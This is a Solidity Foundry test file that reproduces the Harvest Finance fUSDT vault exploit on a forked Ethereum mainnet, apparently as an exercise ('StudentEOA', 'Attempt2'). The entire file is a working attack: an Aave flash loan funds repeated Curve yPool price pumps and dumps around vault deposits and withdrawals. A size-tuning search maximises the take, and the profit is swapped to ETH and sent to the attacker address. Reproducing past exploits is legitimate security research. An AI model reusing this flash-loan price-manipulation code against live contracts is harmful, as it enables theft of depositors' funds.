// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Like {
    function withdraw(uint256 amount) external;
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function coins(int128 i) external view returns (address);
    function underlying_coins(int128 i) external view returns (address);
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address account) external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}

interface ICurveStrategy {
    function depositArbCheck() external view returns (bool);
    function investedUnderlyingBalance() external view returns (uint256);
    function curvePriceCheckpoint() external view returns (uint256);
    function underlyingValueFromYCrv(uint256 ycrvBalance) external view returns (uint256);
    function arbTolerance() external view returns (uint256);
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

/// @title Harvest Attempt 2
/// @notice Hypothesis: the revert in Attempt1 was caused by tuning against
/// `depositArbCheck()` alone and then depositing an oversized USDT chunk. The
/// safe path is to probe the real `pump -> deposit -> dump -> withdraw` flow
/// using `exchange_underlying`, keep the yPool underlying indices at
/// DAI=0/USDC=1/USDT=2/TUSD=3, and deposit only the freshly pumped USDT while
/// reserving flashed USDT for the reverse swap.
contract Attempt2 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    IAaveV2LendingPool constant AAVE_V2 = IAaveV2LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IHVault constant FUSDT_VAULT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    ICurveStrategy constant STRATEGY = ICurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
    ICurveYPool constant CURVE_YPOOL = ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniswapV3Router constant UNISWAP_V3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    int128 constant IDX_DAI = 0;
    int128 constant IDX_USDC = 1;
    int128 constant IDX_USDT = 2;
    int128 constant IDX_TUSD = 3;

    uint256 constant FORK_BLOCK = 11_128_633;
    uint256 constant ITERATIONS = 20;
    uint256 constant PROBE_MIN = 1_000_000e6;
    uint256 constant PROBE_MAX = 5_000_000e6;
    uint256 constant PROBE_STEP = 500_000e6;
    uint256 constant USDT_BUFFER = 10_000e6;
    uint256 constant YCRV_UNIT = 1e18;

    uint256 internal swapSize;
    uint256 internal flashUsdc;
    uint256 internal flashUsdt;

    function setUp() public {
        vm.createSelectFork("ch2", FORK_BLOCK);
        vm.label(ATTACKER, "StudentEOA");
        vm.label(address(AAVE_V2), "AaveV2");
        vm.label(address(FUSDT_VAULT), "Harvest_fUSDT");
        vm.label(address(STRATEGY), "HarvestStrategy");
        vm.label(address(CURVE_YPOOL), "Curve_yPool");
        vm.label(address(UNISWAP_V3), "UniswapV3Router");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(WETH, "WETH");

        vm.deal(ATTACKER, 1 ether);

        _forceApprove(USDC, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(FUSDT_VAULT), type(uint256).max);
        _forceApprove(USDC, address(AAVE_V2), type(uint256).max);
        _forceApprove(USDT, address(AAVE_V2), type(uint256).max);
        _forceApprove(USDC, address(UNISWAP_V3), type(uint256).max);
        _forceApprove(USDT, address(UNISWAP_V3), type(uint256).max);
    }

    function test_exploit() public {
        console.log("[pre] chainId:", block.chainid);
        console.log("[pre] fork block:", block.number);
        console.log("[pre] pool coin[0]:", CURVE_YPOOL.coins(IDX_DAI));
        console.log("[pre] pool coin[1]:", CURVE_YPOOL.coins(IDX_USDC));
        console.log("[pre] pool coin[2]:", CURVE_YPOOL.coins(IDX_USDT));
        console.log("[pre] pool coin[3]:", CURVE_YPOOL.coins(IDX_TUSD));
        console.log("[pre] underlying coin[0]:", CURVE_YPOOL.underlying_coins(IDX_DAI));
        console.log("[pre] underlying coin[1]:", CURVE_YPOOL.underlying_coins(IDX_USDC));
        console.log("[pre] underlying coin[2]:", CURVE_YPOOL.underlying_coins(IDX_USDT));
        console.log("[pre] underlying coin[3]:", CURVE_YPOOL.underlying_coins(IDX_TUSD));
        console.log("[pre] checkpoint:", STRATEGY.curvePriceCheckpoint());
        console.log("[pre] spot:", STRATEGY.underlyingValueFromYCrv(YCRV_UNIT));
        console.log("[pre] arbTolerance:", STRATEGY.arbTolerance());
        console.log("[pre] depositArbCheck:", STRATEGY.depositArbCheck());
        console.log("[pre] vault underlying:", FUSDT_VAULT.underlyingBalanceWithInvestment());
        console.log("[pre] vault PPS:", FUSDT_VAULT.getPricePerFullShare());
        console.log("[pre] strategy invested:", STRATEGY.investedUnderlyingBalance());

        assertEq(CURVE_YPOOL.underlying_coins(IDX_USDC), USDC, "underlying USDC index mismatch");
        assertEq(CURVE_YPOOL.underlying_coins(IDX_USDT), USDT, "underlying USDT index mismatch");

        swapSize = _findBestSwapSize();
        flashUsdc = swapSize;
        flashUsdt = swapSize + USDT_BUFFER;

        console.log("[tune] swapSize:", swapSize);
        console.log("[tune] flashUsdc:", flashUsdc);
        console.log("[tune] flashUsdt:", flashUsdt);

        _previewBestPath();

        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker ETH:", nativeBefore);

        _startFlashLoan();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker ETH:", nativeAfter);
        console.log("[delta] attacker ETH:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance must strictly increase");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "bad lender");
        require(initiator == address(this), "bad initiator");
        require(assets.length == 2, "unexpected assets");

        uint256 usdcOwed;
        uint256 usdtOwed;

        for (uint256 i; i < assets.length; ++i) {
            if (assets[i] == USDC) {
                usdcOwed = amounts[i] + premiums[i];
            } else if (assets[i] == USDT) {
                usdtOwed = amounts[i] + premiums[i];
            } else {
                revert("unknown flash asset");
            }
        }

        console.log("[flash] usdc borrowed:", flashUsdc);
        console.log("[flash] usdt borrowed:", flashUsdt);
        console.log("[flash] usdc owed:", usdcOwed);
        console.log("[flash] usdt owed:", usdtOwed);

        _runLoop(ITERATIONS, swapSize);
        _rebalanceForRepayment(usdcOwed, usdtOwed);

        uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

        console.log("[post-loop] usdc balance:", usdcBal);
        console.log("[post-loop] usdt balance:", usdtBal);
        require(usdcBal >= usdcOwed, "USDC shortfall");
        require(usdtBal >= usdtOwed, "USDT shortfall");

        uint256 usdcProfit = usdcBal - usdcOwed;
        uint256 usdtProfit = usdtBal - usdtOwed;

        console.log("[profit] usdc excess:", usdcProfit);
        console.log("[profit] usdt excess:", usdtProfit);

        _swapStableProfitToEth(usdcProfit, usdtProfit);
        return true;
    }

    receive() external payable {}

    function previewLoop(uint256 candidateSwap, uint256 iterations) external returns (bool success, uint256 grossUsdtOut) {
        require(msg.sender == address(this), "self only");

        deal(USDC, address(this), candidateSwap);
        deal(USDT, address(this), candidateSwap + USDT_BUFFER);

        uint256 startUsdt = candidateSwap + USDT_BUFFER + CURVE_YPOOL.get_dy_underlying(IDX_USDC, IDX_USDT, candidateSwap);

        _runLoop(iterations, candidateSwap);

        uint256 endUsdt = IERC20Like(USDT).balanceOf(address(this))
            + CURVE_YPOOL.get_dy_underlying(IDX_USDC, IDX_USDT, IERC20Like(USDC).balanceOf(address(this)));

        success = true;
        grossUsdtOut = endUsdt > startUsdt ? endUsdt - startUsdt : 0;
    }

    function _startFlashLoan() internal {
        address[] memory assets = new address[](2);
        assets[0] = USDC;
        assets[1] = USDT;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = flashUsdc;
        amounts[1] = flashUsdt;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }

    function _previewBestPath() internal {
        (bool okOne, uint256 grossOne) = _simulate(swapSize, 1);
        console.log("[preview] one-iter success:", okOne);
        console.log("[preview] one-iter gross usdt:", grossOne);

        (bool okMulti, uint256 grossMulti) = _simulate(swapSize, ITERATIONS / 2);
        console.log("[preview] multi-iter success:", okMulti);
        console.log("[preview] multi-iter gross usdt:", grossMulti);
    }

    function _runLoop(uint256 iterations, uint256 candidateSwap) internal {
        for (uint256 i; i < iterations; ++i) {
            uint256 usdtBefore = IERC20Like(USDT).balanceOf(address(this));
            uint256 sharesBefore = FUSDT_VAULT.balanceOf(address(this));
            uint256 ppsBefore = FUSDT_VAULT.getPricePerFullShare();

            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, candidateSwap, 0);

            uint256 pumpedUsdt = IERC20Like(USDT).balanceOf(address(this)) - usdtBefore;
            require(pumpedUsdt > 0, "pump zero");
            require(STRATEGY.depositArbCheck(), "arb check failed");

            FUSDT_VAULT.deposit(pumpedUsdt);
            uint256 sharesMinted = FUSDT_VAULT.balanceOf(address(this)) - sharesBefore;
            require(sharesMinted > 0, "shares zero");

            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, candidateSwap, 0);
            FUSDT_VAULT.withdraw(sharesMinted);

            console.log("[iter] index:", i);
            console.log("[iter] pumped usdt:", pumpedUsdt);
            console.log("[iter] shares minted:", sharesMinted);
            console.log("[iter] pps before:", ppsBefore);
            console.log("[iter] pps after:", FUSDT_VAULT.getPricePerFullShare());
            console.log("[iter] usdc bal:", IERC20Like(USDC).balanceOf(address(this)));
            console.log("[iter] usdt bal:", IERC20Like(USDT).balanceOf(address(this)));
        }
    }

    function _findBestSwapSize() internal returns (uint256 bestSwap) {
        uint256 bestGross;

        for (uint256 candidate = PROBE_MIN; candidate <= PROBE_MAX; candidate += PROBE_STEP) {
            (bool ok, uint256 grossUsdtOut) = _simulate(candidate, 1);

            console.log("[probe] candidate:", candidate);
            console.log("[probe] success:", ok);
            console.log("[probe] gross usdt:", grossUsdtOut);

            if (ok && grossUsdtOut >= bestGross) {
                bestSwap = candidate;
                bestGross = grossUsdtOut;
            }
        }

        require(bestSwap != 0, "no safe swap found");
    }

    function _simulate(uint256 candidate, uint256 iterations) internal returns (bool ok, uint256 grossUsdtOut) {
        uint256 snapshot = vm.snapshotState();

        try this.previewLoop(candidate, iterations) returns (bool success, uint256 grossOut) {
            ok = success;
            grossUsdtOut = grossOut;
        } catch {
            ok = false;
        }

        require(vm.revertToStateAndDelete(snapshot), "simulate revert failed");
    }

    function _rebalanceForRepayment(uint256 usdcOwed, uint256 usdtOwed) internal {
        uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

        if (usdcBal < usdcOwed) {
            uint256 deficit = usdcOwed - usdcBal;
            uint256 usdtIn = _findInputForOutput(IDX_USDT, IDX_USDC, deficit, 1e6, usdtBal);

            console.log("[rebalance] usdc deficit:", deficit);
            console.log("[rebalance] usdt in:", usdtIn);

            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, usdtIn, 0);
        }

        usdcBal = IERC20Like(USDC).balanceOf(address(this));
        usdtBal = IERC20Like(USDT).balanceOf(address(this));

        if (usdtBal < usdtOwed) {
            uint256 deficit = usdtOwed - usdtBal;
            uint256 usdcIn = _findInputForOutput(IDX_USDC, IDX_USDT, deficit, 1e6, usdcBal);

            console.log("[rebalance] usdt deficit:", deficit);
            console.log("[rebalance] usdc in:", usdcIn);

            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, usdcIn, 0);
        }
    }

    function _findInputForOutput(
        int128 tokenIn,
        int128 tokenOut,
        uint256 desiredOut,
        uint256 low,
        uint256 high
    ) internal view returns (uint256 best) {
        best = high;

        while (low <= high) {
            uint256 mid = low + ((high - low) / 2);
            uint256 out = CURVE_YPOOL.get_dy_underlying(tokenIn, tokenOut, mid);

            if (out >= desiredOut) {
                best = mid;
                if (mid == 0) break;
                high = mid - 1;
            } else {
                low = mid + 1;
            }
        }
    }

    function _swapStableProfitToEth(uint256 usdcProfit, uint256 usdtProfit) internal {
        if (usdcProfit > 0) {
            UNISWAP_V3.exactInputSingle(
                IUniswapV3Router.ExactInputSingleParams({
                    tokenIn: USDC,
                    tokenOut: WETH,
                    fee: 500,
                    recipient: address(this),
                    deadline: block.timestamp + 60,
                    amountIn: usdcProfit,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        if (usdtProfit > 0) {
            UNISWAP_V3.exactInputSingle(
                IUniswapV3Router.ExactInputSingleParams({
                    tokenIn: USDT,
                    tokenOut: WETH,
                    fee: 500,
                    recipient: address(this),
                    deadline: block.timestamp + 60,
                    amountIn: usdtProfit,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
            (bool sent,) = ATTACKER.call{value: wethBal}("");
            require(sent, "eth transfer failed");
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0), "approve reset");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount), "approve set");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory err) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, err);

        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), err);
        }
    }
}
